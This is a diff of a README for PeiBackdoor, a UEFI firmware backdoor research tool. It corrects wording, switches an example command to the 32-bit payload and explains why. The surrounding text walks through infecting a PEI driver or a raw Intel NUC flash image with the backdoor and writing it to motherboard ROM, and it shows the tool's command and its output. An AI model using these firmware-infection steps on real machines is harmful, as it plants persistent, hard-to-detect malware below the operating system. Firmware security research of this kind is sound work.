@@ -76,14 +76,14 @@ To run `PeiBackdoor.efi` on your physical machine:
 
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="https://raw.githubusercontent.com/Cr4sh/blog/master/pei-replace.png" width="650" height="378" style="border: 0px;"></img>
 
-3. Infect extracted PE or TE image with `SmmBackdoor_IA32.efi` or `SmmBackdoor_X64.efi` depending to it's architecture: `python PeiBackdoor.py -d image.efi -o image_patched.bin -p PeiBackdoor_IA32.efi`
+3. Infect extracted PE or TE image with `SmmBackdoor_IA32.efi` or `SmmBackdoor_X64.efi` depending on it's architecture: `python PeiBackdoor.py -d image.efi -o image_patched.bin -p PeiBackdoor_IA32.efi`
 
 4. Use UEFITool to replace original PE image with `image_patched.bin`, save modified flash image into the file and write it to the motherboard ROM with programmer.
 
 Unfortunately, on some machines (for example my Intel NUC) patched flash image is not working after it's modification with UEFITool, so, I implemented `-f` option for `PeiBackdoor.py` that allows to infect raw firmware image without it's rebuild. Here's example of it's usage to infect [SYSKLi35.86A](https://downloadcenter.intel.com/download/26195/BIOS-Update-SYSKLi35-86A-?product=89190) firmware of Skylake based Intel NUC:
 
 ```
-$ python PeiBackdoor.py -f flash.bin -p PeiBackdoor.efi -o flash_patched.bin
+$ python PeiBackdoor.py -f flash.bin -p PeiBackdoor_IA32.efi -o flash_patched.bin
 [+] Target image: flash.bin
 [+] Payload: PeiBackdoor.efi
 [+] Output file: flash_patched.bin
@@ -97,6 +97,8 @@ Target PEI driver was successfully patched
 Relocating payload to 0xfffde040
 Flash was successfully infected
 ```
+
+Please note, that I used 32-bit `PeiBackdoor_IA32.efi` backdoor binary because Intel NUC, like lots of others machines with AMI based firmware, has 32-bit PEI phase code (I guess, mostly because it allows to have a bit smaller binaries than x86_64).
 
 ## Running on QEMU <a id="_4"></a>
 
